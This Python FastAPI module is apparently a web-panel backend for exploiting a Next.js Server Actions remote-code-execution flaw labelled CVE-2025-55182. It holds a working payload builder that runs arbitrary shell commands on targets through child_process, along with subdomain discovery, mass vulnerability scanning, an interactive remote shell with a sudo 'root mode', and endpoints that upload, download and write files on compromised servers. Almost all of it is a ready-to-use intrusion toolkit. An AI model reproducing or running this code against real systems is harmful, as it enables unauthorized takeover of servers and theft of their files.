"""
Advanced Tools — Custom security modules
React2Shell: CVE-2025-55182 Next.js Server Actions RCE
Created by Master Ramdan
"""
from typing import Optional, List, Dict, Any, AsyncGenerator
from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
import httpx, base64, re, asyncio, json as _json
from urllib.parse import unquote

from app.db.models import User
from app.api.deps import get_current_user

router = APIRouter()

# ── Wordlist ──────────────────────────────────────────────────
COMMON_SUBDOMAINS = [
    "www","mail","ftp","localhost","webmail","smtp","pop","ns1","webdisk",
    "ns2","cpanel","whm","autodiscover","autoconfig","m","imap","test","ns",
    "blog","pop3","dev","www2","admin","forum","news","vpn","ns3","mail2",
    "new","mysql","old","lists","support","mobile","mx","static","docs",
    "beta","shop","sql","secure","demo","cp","calendar","wiki","web","media",
    "email","images","img","www1","intranet","portal","video","sip","dns2",
    "api","cdn","stats","dns1","ns4","www3","dns","search","staging","server",
    "mx1","chat","wap","my","svn","mail1","sites","proxy","ads","host","crm",
    "cms","backup","mx2","info","apps","download","remote","db","forums",
    "store","relay","files","newsletter","app","live","owa","en","start",
    "sms","office","exchange","ipv4","help","home","git","ww1","invoice",
    "partners","site","s","public","photos","upload","members","dashboard",
    "sandbox","connect","loyalty","stage",
]

TEST_ENDPOINTS = ["", "/api", "/api/auth", "/_next", "/admin", "/dashboard"]

HEADERS_BASE = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Next-Action": "x",
    "X-Nextjs-Request-Id": "b5dce965",
    "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
}

# ── Payload builder ───────────────────────────────────────────
def build_payload(cmd: str) -> tuple[str, str]:
    cmd_escaped = cmd.replace("'", "\\'")
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',"
        f"{{'timeout':5000}}).toString('base64');"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:`NEXT_REDIRECT;push;"
        f"/login?a=${{{{res}}}};307;`}});"
    )
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )
    body = (
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        "Content-Disposition: form-data; name=\"0\"\r\n\r\n" + part0 + "\r\n"
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        "Content-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n"
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        "Content-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n"
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )
    content_type = "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    return body, content_type


def parse_output(headers: dict, body: str) -> Optional[str]:
    combined = (
        headers.get("x-action-redirect", "") + " " +
        headers.get("location", "") + " " + body[:500]
    )
    patterns = [
        r'.*/login\?a=(.*?)(?:;|$)',
        r'login\?a=(.*?)(?:;|$)',
        r'\?a=(.*?)(?:;|$)',
        r'a=(.*?)(?:;|&|$)',
    ]
    for p in patterns:
        m = re.search(p, combined)
        if m:
            try:
                return base64.b64decode(unquote(m.group(1))).decode("utf-8", errors="ignore").strip()
            except Exception:
                pass
    return None


async def do_exec(target_url: str, cmd: str, timeout: int = 15) -> dict:
    body, ct = build_payload(cmd)
    headers = {**HEADERS_BASE, "Content-Type": ct}
    try:
        async with httpx.AsyncClient(verify=False, timeout=timeout, follow_redirects=False) as c:
            r = await c.post(target_url, headers=headers, content=body.encode())
            resp_body = ""
            try: resp_body = r.text[:500]
            except Exception: pass
            output = parse_output(dict(r.headers), resp_body)
            return {"output": output or f"[!] No output (HTTP {r.status_code})", "status_code": r.status_code}
    except httpx.TimeoutException:
        return {"output": "[-] Request timed out", "status_code": 0}
    except Exception as e:
        return {"output": f"[-] Error: {str(e)}", "status_code": 0}


# ── Schemas ───────────────────────────────────────────────────
WORDLIST_PATHS = {
    "default": None,  # OSINT passive recon
    "builtin": None,  # pakai COMMON_SUBDOMAINS
    "tiny":   "/app/wordlist/subdomain/subdomain_tiny.txt",
    "small":  "/app/wordlist/subdomain/subdomain_small.txt",
    "medium": "/app/wordlist/subdomain/subdomain_medium.txt",
    "large":  "/app/wordlist/subdomain/subdomain_large.txt",
    "huge":   "/app/wordlist/subdomain/subdomain_huge.txt",
}

# ── OSINT API Keys (optional) ─────────────────────────────────
import os as _os
OSINT_KEYS = {
    "virustotal":     _os.getenv("VIRUSTOTAL_API_KEY", ""),
    "securitytrails": _os.getenv("SECURITYTRAILS_API_KEY", ""),
    "censys_token":   _os.getenv("CENSYS_API_TOKEN", ""),  # Personal Access Token (v2)
}

def load_wordlist(name: str) -> list[str]:
    path = WORDLIST_PATHS.get(name)
    if not path:
        return COMMON_SUBDOMAINS
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            words = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        return words if words else COMMON_SUBDOMAINS
    except FileNotFoundError:
        return COMMON_SUBDOMAINS


class SubdomainScanRequest(BaseModel):
    domain: str
    wordlist: str = "builtin"  # builtin | tiny | small | medium | large | huge
    timeout: int = 5

class VulnScanRequest(BaseModel):
    targets: List[str]
    timeout: int = 15

class ShellTestRequest(BaseModel):
    target_url: str
    timeout: int = 10

class ShellExecRequest(BaseModel):
    target_url: str
    command: str
    current_dir: Optional[str] = None
    root_mode: bool = False
    timeout: int = 15

class FileUploadRequest(BaseModel):
    target_url: str
    remote_path: str
    file_content_b64: str  # base64 encoded file content
    timeout: int = 30

class FileDownloadRequest(BaseModel):
    target_url: str
    remote_path: str
    current_dir: Optional[str] = None
    timeout: int = 30

class FileCreateRequest(BaseModel):
    target_url: str
    remote_path: str
    content: str
    current_dir: Optional[str] = None
    timeout: int = 15


# ── Routes ────────────────────────────────────────────────────
@router.get("/react2shell/wordlists")
async def get_wordlists(current_user: User = Depends(get_current_user)):
    """Return available wordlists with entry counts"""
    result = []
    for name, path in WORDLIST_PATHS.items():
        if name == "default":
            sources = ["crt.sh", "Wayback"]
            if OSINT_KEYS["virustotal"]: sources.append("VirusTotal")
            if OSINT_KEYS["securitytrails"]: sources.append("SecurityTrails")
            if OSINT_KEYS["censys_token"]: sources.append("Censys")
            result.append({
                "name": "default",
                "label": f"OSINT Passive ({', '.join(sources)})",
                "count": 0,
                "available": True,
                "sources": sources,
                "osint": True,
            })
        elif not path:
            result.append({"name": name, "label": f"Built-in ({len(COMMON_SUBDOMAINS)})", "count": len(COMMON_SUBDOMAINS), "available": True, "osint": False})
        else:
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    count = sum(1 for l in f if l.strip() and not l.startswith("#"))
                result.append({"name": name, "label": f"{name.capitalize()} ({count:,})", "count": count, "available": True, "osint": False})
            except FileNotFoundError:
                result.append({"name": name, "label": f"{name.capitalize()} (unavailable)", "count": 0, "available": False, "osint": False})
    return result


# ── OSINT collectors ──────────────────────────────────────────
async def osint_crtsh(domain: str) -> set:
    """crt.sh — certificate transparency logs, no API key needed"""
    results = set()
    try:
        async with httpx.AsyncClient(verify=False, timeout=30) as c:
            r = await c.get(f"https://crt.sh/?q=%.{domain}&output=json")
            if r.status_code == 200:
                for entry in r.json():
                    for name in entry.get("name_value", "").split("\n"):
                        name = name.strip().lstrip("*.")
                        if name.endswith(f".{domain}") or name == domain:
                            sub = name.replace(f".{domain}", "")
                            if sub and "." not in sub:
                                results.add(sub)
    except Exception:
        pass
    return results


async def osint_wayback(domain: str) -> set:
    """Wayback Machine CDX API — no API key needed"""
    results = set()
    try:
        async with httpx.AsyncClient(verify=False, timeout=30) as c:
            url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}&output=json&fl=original&collapse=urlkey&limit=5000"
            r = await c.get(url)
            if r.status_code == 200:
                for entry in r.json()[1:]:  # skip header row
                    try:
                        from urllib.parse import urlparse as _urlparse
                        parsed = _urlparse(entry[0])
                        host = parsed.hostname or ""
                        if host.endswith(f".{domain}"):
                            sub = host.replace(f".{domain}", "")
                            if sub and "." not in sub:
                                results.add(sub)
                    except Exception:
                        pass
    except Exception:
        pass
    return results


async def osint_virustotal(domain: str, api_key: str) -> set:
    """VirusTotal subdomains API"""
    results = set()
    if not api_key:
        return results
    try:
        async with httpx.AsyncClient(verify=False, timeout=20) as c:
            r = await c.get(
                f"https://www.virustotal.com/api/v3/domains/{domain}/subdomains?limit=40",
                headers={"x-apikey": api_key},
            )
            if r.status_code == 200:
                for item in r.json().get("data", []):
                    host = item.get("id", "")
                    if host.endswith(f".{domain}"):
                        sub = host.replace(f".{domain}", "")
                        if sub and "." not in sub:
                            results.add(sub)
    except Exception:
        pass
    return results


async def osint_securitytrails(domain: str, api_key: str) -> set:
    """SecurityTrails subdomains API"""
    results = set()
    if not api_key:
        return results
    try:
        async with httpx.AsyncClient(verify=False, timeout=20) as c:
            r = await c.get(
                f"https://api.securitytrails.com/v1/domain/{domain}/subdomains?children_only=false&include_inactive=false",
                headers={"APIKEY": api_key},
            )
            if r.status_code == 200:
                for sub in r.json().get("subdomains", []):
                    if sub and "." not in sub:
                        results.add(sub)
    except Exception:
        pass
    return results


async def osint_censys(domain: str, token: str) -> set:
    """Censys v2 — Personal Access Token, query hosts by domain"""
    results = set()
    if not token:
        return results
    try:
        async with httpx.AsyncClient(verify=False, timeout=20) as c:
            # Search hosts that have the domain in their certificates
            r = await c.get(
                f"https://search.censys.io/api/v2/hosts/search",
                headers={"Authorization": f"Bearer {token}"},
                params={"q": f"dns.reverse_dns.reverse_dns: {domain}", "per_page": 100},
            )
            if r.status_code == 200:
                for hit in r.json().get("result", {}).get("hits", []):
                    for name in hit.get("dns", {}).get("reverse_dns", {}).get("reverse_dns", []):
                        name = str(name).strip().rstrip(".")
                        if name.endswith(f".{domain}"):
                            sub = name.replace(f".{domain}", "")
                            if sub and "." not in sub:
                                results.add(sub)
            # Also search certificates
            r2 = await c.get(
                "https://search.censys.io/api/v2/certificates/search",
                headers={"Authorization": f"Bearer {token}"},
                params={"q": f"parsed.names: {domain}", "per_page": 100},
            )
            if r2.status_code == 200:
                for hit in r2.json().get("result", {}).get("hits", []):
                    for name in hit.get("parsed", {}).get("names", []):
                        name = str(name).strip().lstrip("*.")
                        if name.endswith(f".{domain}"):
                            sub = name.replace(f".{domain}", "")
                            if sub and "." not in sub:
                                results.add(sub)
    except Exception:
        pass
    return results


@router.get("/react2shell/subdomain-scan-stream")
async def subdomain_scan_stream(
    request: Request,
    domain: str,
    wordlist: str = "builtin",
    timeout: int = 5,
    current_user: User = Depends(get_current_user),
):
    """SSE streaming subdomain scan — kirim hasil realtime per subdomain yang ditemukan"""
    clean_domain = domain.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
    words = load_wordlist(wordlist)

    async def event_stream() -> AsyncGenerator[str, None]:
        def sse(data: dict) -> str:
            return f"data: {_json.dumps(data)}\n\n"

        # ── OSINT mode ──────────────────────────────────────────
        if wordlist == "default":
            yield sse({"type": "osint_start", "domain": clean_domain, "sources": []})

            all_subs: set = set()

            # crt.sh
            yield sse({"type": "osint_source", "source": "crt.sh", "status": "running"})
            subs = await osint_crtsh(clean_domain)
            all_subs.update(subs)
            yield sse({"type": "osint_source", "source": "crt.sh", "status": "done", "count": len(subs)})

            # Wayback
            yield sse({"type": "osint_source", "source": "Wayback", "status": "running"})
            subs = await osint_wayback(clean_domain)
            all_subs.update(subs)
            yield sse({"type": "osint_source", "source": "Wayback", "status": "done", "count": len(subs)})

            # VirusTotal
            if OSINT_KEYS["virustotal"]:
                yield sse({"type": "osint_source", "source": "VirusTotal", "status": "running"})
                subs = await osint_virustotal(clean_domain, OSINT_KEYS["virustotal"])
                all_subs.update(subs)
                yield sse({"type": "osint_source", "source": "VirusTotal", "status": "done", "count": len(subs)})
            else:
                yield sse({"type": "osint_source", "source": "VirusTotal", "status": "skipped", "reason": "no API key"})

            # SecurityTrails
            if OSINT_KEYS["securitytrails"]:
                yield sse({"type": "osint_source", "source": "SecurityTrails", "status": "running"})
                subs = await osint_securitytrails(clean_domain, OSINT_KEYS["securitytrails"])
                all_subs.update(subs)
                yield sse({"type": "osint_source", "source": "SecurityTrails", "status": "done", "count": len(subs)})
            else:
                yield sse({"type": "osint_source", "source": "SecurityTrails", "status": "skipped", "reason": "no API key"})

            # Censys
            if OSINT_KEYS["censys_token"]:
                yield sse({"type": "osint_source", "source": "Censys", "status": "running"})
                subs = await osint_censys(clean_domain, OSINT_KEYS["censys_token"])
                all_subs.update(subs)
                yield sse({"type": "osint_source", "source": "Censys", "status": "done", "count": len(subs)})
            else:
                yield sse({"type": "osint_source", "source": "Censys", "status": "skipped", "reason": "no API key"})

            # Now HTTP-verify each discovered subdomain
            total_unique = len(all_subs)
            yield sse({"type": "start", "domain": clean_domain, "total": total_unique, "wordlist": "default",
                        "note": f"Verifying {total_unique} unique subdomains from OSINT..."})

            found = []
            scanned = 0
            batch_size = 30

            async def check_sub(sub: str):
                full = f"{sub}.{clean_domain}"
                for proto in ["https", "http"]:
                    url = f"{proto}://{full}"
                    try:
                        async with httpx.AsyncClient(verify=False, timeout=timeout, follow_redirects=True) as c:
                            r = await c.get(url)
                            if r.status_code < 500:
                                return {"subdomain": sub, "full_domain": full, "url": url, "status": r.status_code}
                    except Exception:
                        continue
                return None

            sub_list = list(all_subs)
            for i in range(0, len(sub_list), batch_size):
                if await request.is_disconnected():
                    yield sse({"type": "cancelled", "scanned": scanned, "found": len(found), "items": found})
                    return
                batch = sub_list[i:i+batch_size]
                results = await asyncio.gather(*[check_sub(s) for s in batch], return_exceptions=True)
                scanned += len(batch)
                for r in results:
                    if r and not isinstance(r, Exception):
                        found.append(r)
                        yield sse({"type": "found", "item": r, "scanned": scanned, "total": total_unique})
                yield sse({"type": "progress", "scanned": scanned, "total": total_unique, "found": len(found)})

            yield sse({"type": "done", "scanned": scanned, "total": total_unique, "found": len(found), "items": found})
            return

        # ── Wordlist mode ───────────────────────────────────────
        yield sse({"type": "start", "domain": clean_domain, "total": len(words), "wordlist": wordlist})

        found = []
        batch_size = 30
        scanned = 0

        async def check(sub: str):
            full = f"{sub}.{clean_domain}"
            for proto in ["https", "http"]:
                url = f"{proto}://{full}"
                try:
                    async with httpx.AsyncClient(verify=False, timeout=timeout, follow_redirects=True) as c:
                        r = await c.get(url)
                        if r.status_code < 500:
                            return {"subdomain": sub, "full_domain": full, "url": url, "status": r.status_code}
                except Exception:
                    continue
            return None

        for i in range(0, len(words), batch_size):
            # Check if client disconnected
            if await request.is_disconnected():
                yield sse({"type": "cancelled", "scanned": scanned, "found": len(found), "items": found})
                return

            batch = words[i:i+batch_size]
            results = await asyncio.gather(*[check(s) for s in batch], return_exceptions=True)
            scanned += len(batch)

            for r in results:
                if r and not isinstance(r, Exception):
                    found.append(r)
                    yield sse({"type": "found", "item": r, "scanned": scanned, "total": len(words)})

            # Progress update setiap batch
            yield sse({"type": "progress", "scanned": scanned, "total": len(words), "found": len(found)})

        yield sse({"type": "done", "scanned": scanned, "total": len(words), "found": len(found), "items": found})

    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",  # disable nginx buffering
        }
    )


# Keep POST endpoint for backward compat
@router.post("/react2shell/subdomain-scan")
async def subdomain_scan(
    req: SubdomainScanRequest,
    current_user: User = Depends(get_current_user),
):
    clean_domain = req.domain.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
    wordlist = load_wordlist(req.wordlist)

    async def check(sub: str):
        full = f"{sub}.{clean_domain}"
        for proto in ["https", "http"]:
            url = f"{proto}://{full}"
            try:
                async with httpx.AsyncClient(verify=False, timeout=req.timeout, follow_redirects=True) as c:
                    r = await c.get(url)
                    if r.status_code < 500:
                        return {"subdomain": sub, "full_domain": full, "url": url, "status": r.status_code}
            except Exception:
                continue
        return None

    batch_size = 50
    found = []
    for i in range(0, len(wordlist), batch_size):
        batch = wordlist[i:i+batch_size]
        results = await asyncio.gather(*[check(s) for s in batch], return_exceptions=True)
        found.extend(r for r in results if r and not isinstance(r, Exception))

    return {"domain": clean_domain, "total": len(found), "items": found, "wordlist": req.wordlist, "scanned": len(wordlist)}


@router.post("/react2shell/vuln-scan")
async def vuln_scan(
    req: VulnScanRequest,
    current_user: User = Depends(get_current_user),
):
    body, ct = build_payload("echo 'VULN_TEST_12345'")
    headers = {**HEADERS_BASE, "Content-Type": ct}

    async def test_target(target: str):
        base = target.rstrip("/")
        for ep in TEST_ENDPOINTS:
            url = f"{base}{ep}"
            try:
                async with httpx.AsyncClient(verify=False, timeout=req.timeout, follow_redirects=False) as c:
                    r = await c.post(url, headers=headers, content=body.encode())
                    resp_body = ""
                    try: resp_body = r.text[:500]
                    except Exception: pass
                    out = parse_output(dict(r.headers), resp_body)
                    if out and "VULN_TEST_12345" in out:
                        return {"target": target, "vulnerable": True, "working_endpoint": url}

                    # Check 500 + retry with id command (like original script)
                    if r.status_code == 500:
                        body2, ct2 = build_payload("id")
                        h2 = {**HEADERS_BASE, "Content-Type": ct2}
                        try:
                            async with httpx.AsyncClient(verify=False, timeout=req.timeout, follow_redirects=False) as c2:
                                r2 = await c2.post(url, headers=h2, content=body2.encode())
                                rb2 = ""
                                try: rb2 = r2.text[:500]
                                except: pass
                                out2 = parse_output(dict(r2.headers), rb2)
                                if out2 and ("uid=" in out2 or "root" in out2):
                                    return {"target": target, "vulnerable": True, "working_endpoint": url}
                        except Exception:
                            pass

                    # Redirect pattern check (like original)
                    if r.status_code in [307, 308]:
                        loc = r.headers.get("location","") + r.headers.get("x-action-redirect","")
                        if "login" in loc.lower() and "a=" in loc:
                            return {"target": target, "vulnerable": True, "working_endpoint": url}
            except Exception:
                continue
        return {"target": target, "vulnerable": False, "working_endpoint": None}

    results = await asyncio.gather(*[test_target(t) for t in req.targets], return_exceptions=True)
    items = [r for r in results if not isinstance(r, Exception)]
    vulnerable = [r for r in items if r["vulnerable"]]
    return {"total_scanned": len(items), "total_vulnerable": len(vulnerable), "results": items}


@router.post("/react2shell/test-connection")
async def test_connection(
    req: ShellTestRequest,
    current_user: User = Depends(get_current_user),
):
    target = req.target_url
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    # Test reachable — try https then http
    reachable = False
    for t in [target, target.replace("https://", "http://")]:
        try:
            async with httpx.AsyncClient(verify=False, timeout=req.timeout, follow_redirects=True) as c:
                r = await c.get(t)
                if r.status_code < 500:
                    target = t
                    reachable = True
                    break
        except Exception:
            continue

    # Try alternative ports if still unreachable
    if not reachable:
        base_host = re.sub(r'https?://', '', target).split('/')[0].split(':')[0]
        for port in [3000, 8080, 8000, 5000]:
            for proto in ["https", "http"]:
                t = f"{proto}://{base_host}:{port}"
                try:
                    async with httpx.AsyncClient(verify=False, timeout=5, follow_redirects=True) as c:
                        r = await c.get(t)
                        if r.status_code < 500:
                            target = t
                            reachable = True
                            break
                except Exception:
                    continue
            if reachable:
                break

    if not reachable:
        return {"reachable": False, "vulnerable": False, "target": target, "working_endpoint": None}

    # Test vulnerable
    body, ct = build_payload("echo 'VULN_TEST_12345'")
    headers = {**HEADERS_BASE, "Content-Type": ct}
    working_endpoint = None

    for ep in TEST_ENDPOINTS:
        url = f"{target.rstrip('/')}{ep}"
        try:
            async with httpx.AsyncClient(verify=False, timeout=req.timeout, follow_redirects=False) as c:
                r = await c.post(url, headers=headers, content=body.encode())
                resp_body = ""
                try: resp_body = r.text[:500]
                except Exception: pass
                out = parse_output(dict(r.headers), resp_body)
                if out and "VULN_TEST_12345" in out:
                    working_endpoint = url
                    break
        except Exception:
            continue

    return {
        "reachable": reachable,
        "vulnerable": working_endpoint is not None,
        "target": target,
        "working_endpoint": working_endpoint,
    }


@router.post("/react2shell/exec")
async def shell_exec(
    req: ShellExecRequest,
    current_user: User = Depends(get_current_user),
):
    cmd = req.command
    if req.current_dir:
        cmd = f"cd {req.current_dir} && {cmd}"
    if req.root_mode:
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        final_cmd = f"echo {cmd_b64} | base64 -d | sudo -i 2>&1 || true"
    else:
        final_cmd = f"({cmd}) 2>&1 || true"

    result = await do_exec(req.target_url, final_cmd, req.timeout)
    new_dir = None

    # Update dir if cd command
    if req.command.strip().startswith("cd ") and result["output"]:
        for line in result["output"].splitlines():
            if line.strip().startswith("/"):
                new_dir = line.strip()
                break
    elif req.command.strip() == "pwd" and result["output"]:
        lines = result["output"].splitlines()
        if lines and lines[0].startswith("/"):
            new_dir = lines[0].strip()

    return {**result, "new_dir": new_dir}


@router.post("/react2shell/upload")
async def file_upload(
    req: FileUploadRequest,
    current_user: User = Depends(get_current_user),
):
    """Upload file via base64 chunked transfer"""
    try:
        file_bytes = base64.b64decode(req.file_content_b64)
        file_b64 = base64.b64encode(file_bytes).decode()
        file_size = len(file_bytes)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid base64: {e}")

    chunk_size = 50000
    chunks = [file_b64[i:i+chunk_size] for i in range(0, len(file_b64), chunk_size)]

    # Remove old file
    await do_exec(req.target_url, f"rm -f {req.remote_path}", req.timeout)

    # Upload chunks
    for i, chunk in enumerate(chunks):
        op = ">" if i == 0 else ">>"
        cmd = f"echo '{chunk}' | base64 -d {op} {req.remote_path}"
        result = await do_exec(req.target_url, cmd, req.timeout)
        if "error" in result["output"].lower() or result["status_code"] == 0:
            return {"success": False, "error": f"Upload failed at chunk {i+1}", "detail": result["output"]}

    # Verify
    verify = await do_exec(req.target_url, f"ls -lh {req.remote_path} 2>&1", req.timeout)
    success = req.remote_path in verify["output"]
    return {
        "success": success,
        "remote_path": req.remote_path,
        "file_size": file_size,
        "chunks": len(chunks),
        "verify_output": verify["output"],
    }


@router.post("/react2shell/download")
async def file_download(
    req: FileDownloadRequest,
    current_user: User = Depends(get_current_user),
):
    """Download file from target via base64"""
    cmd = req.remote_path
    if req.current_dir:
        cmd = f"base64 -w0 {req.remote_path}"
    else:
        cmd = f"base64 -w0 {req.remote_path}"

    if req.current_dir:
        result = await do_exec(req.target_url, f"cd {req.current_dir} && {cmd}", req.timeout)
    else:
        result = await do_exec(req.target_url, cmd, req.timeout)

    output = result["output"]
    if not output or "No such file" in output or "[!" in output or "[-]" in output:
        return {"success": False, "error": output}

    try:
        clean = output.replace('\n', '').replace('\r', '').strip()
        file_bytes = base64.b64decode(clean)
        return {
            "success": True,
            "file_content_b64": base64.b64encode(file_bytes).decode(),
            "file_size": len(file_bytes),
            "remote_path": req.remote_path,
        }
    except Exception as e:
        return {"success": False, "error": f"Decode failed: {e}", "raw": output[:200]}


@router.post("/react2shell/create-file")
async def file_create(
    req: FileCreateRequest,
    current_user: User = Depends(get_current_user),
):
    """Create file on target with given content"""
    content_b64 = base64.b64encode(req.content.encode()).decode()
    cmd = f"echo '{content_b64}' | base64 -d > {req.remote_path}"
    if req.current_dir:
        cmd = f"cd {req.current_dir} && {cmd}"

    result = await do_exec(req.target_url, cmd, req.timeout)

    verify = await do_exec(req.target_url, f"ls -lh {req.remote_path} && head -n 3 {req.remote_path}", req.timeout)
    success = req.remote_path in verify["output"]
    return {
        "success": success,
        "remote_path": req.remote_path,
        "verify_output": verify["output"],
    }
